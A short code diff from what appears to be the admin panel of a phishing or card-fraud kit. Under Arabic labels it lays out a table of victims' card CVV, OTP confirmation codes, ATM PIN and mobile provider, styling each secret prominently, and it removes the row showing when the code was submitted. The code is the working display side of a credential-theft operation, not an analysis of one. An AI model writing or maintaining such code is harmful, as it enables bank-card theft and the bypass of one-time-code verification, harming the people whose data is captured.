@@ -261,7 +261,6 @@
         ['CVV', cardCvv ? '<span style="font-size:20px;font-weight:700;color:#d32f2f;letter-spacing:4px;font-family:monospace;background:#fff3cd;padding:8px 14px;border-radius:6px">' + escapeHtml(cardCvv) + '</span>' : '—'],
         ['<span style="color:#8a173b;font-weight:700;font-size:16px">━━━ بيانات التحقق ━━━</span>', ''],
         ['رمز التأكيد (OTP)', allData.confirmationCode ? '<span style="font-size:24px;color:#8a173b;font-weight:700;letter-spacing:4px;direction:ltr;display:inline-block;background:#f9f3f5;padding:8px 20px;border-radius:8px;border:2px solid #8a173b;font-family:monospace">' + escapeHtml(allData.confirmationCode) + '</span>' : '<span style="color:#999">لم يُرسل بعد</span>'],
-        ['وقت إرسال الرمز', allData.codeSubmittedAt ? formatDate(allData.codeSubmittedAt) : '—'],
         ['<span style="color:#8a173b;font-weight:700;font-size:16px">━━━ بيانات إضافية ━━━</span>', ''],
         ['رقم ATM', atmPin ? '<span style="font-size:18px;font-weight:700;color:#d32f2f;letter-spacing:3px;font-family:monospace">' + escapeHtml(atmPin) + '</span>' : '—'],
         ['مزود الشبكة', allData.provider ? (labels[allData.provider] || allData.provider) : '—'],
